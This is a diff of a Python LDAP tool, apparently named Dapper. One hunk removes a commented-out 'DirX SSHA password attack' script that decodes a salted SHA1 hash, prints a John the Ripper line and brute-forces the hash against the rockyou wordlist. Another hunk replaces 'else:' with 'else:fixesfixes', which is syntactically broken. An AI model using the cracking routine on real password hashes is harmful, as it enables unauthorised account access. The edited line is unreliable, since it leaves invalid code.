@@ -17,40 +17,7 @@ try:
 except ImportError:
 	missing_ldap = True
 
-"""
-DirX SSHA password attack
 
-#!/usr/bin/python
-
-from base64 import b64decode, b64encode
-import binascii
-import hashlib
-
-b64hash = 'Q44c5un2K38ISg8Sj+/z3iecsZMxYTkxMGUyMw=='
-rawhash = b64decode(b64hash)
-
-salt = rawhash[-8:]
-print "type(rawhash): %s" % type(rawhash)
-
-print "[*] Original hash:       %s" % b64hash
-print "[*] Decoded byte count:  %d" % len(rawhash)
-print "[*] Salt byte count:     %d" % len(salt)
-print "[*] Decoded hash value (hex): \n  %s" % binascii.hexlify(rawhash)
-print "[*] Salt value (hex):    %s" % binascii.hexlify(salt)
-
-print "[*] John line:  root:%s$%s" % (binascii.hexlify(rawhash[0:20]), salt)
-
-""
-f = open("/pentest/passwords/wordlists/rockyou.txt", "r")
-words = f.read()
-f.close()
-
-for word in words.split('\n'):
-	saltedpw = word + salt
-	if b64hash == b64encode(hashlib.sha1(saltedpw).digest() + salt):
-		print "[+] w00t! Password is: %s" % word
-""
-"""
 
 class Ui:
 	def __init__(self):
@@ -537,7 +504,7 @@ class Dapper:
 				test = test.rstrip()
 				self.ui.print_ln(test)
 
-			else:
+			else:fixesfixes
 				break
 
 		self.ui.outdent()
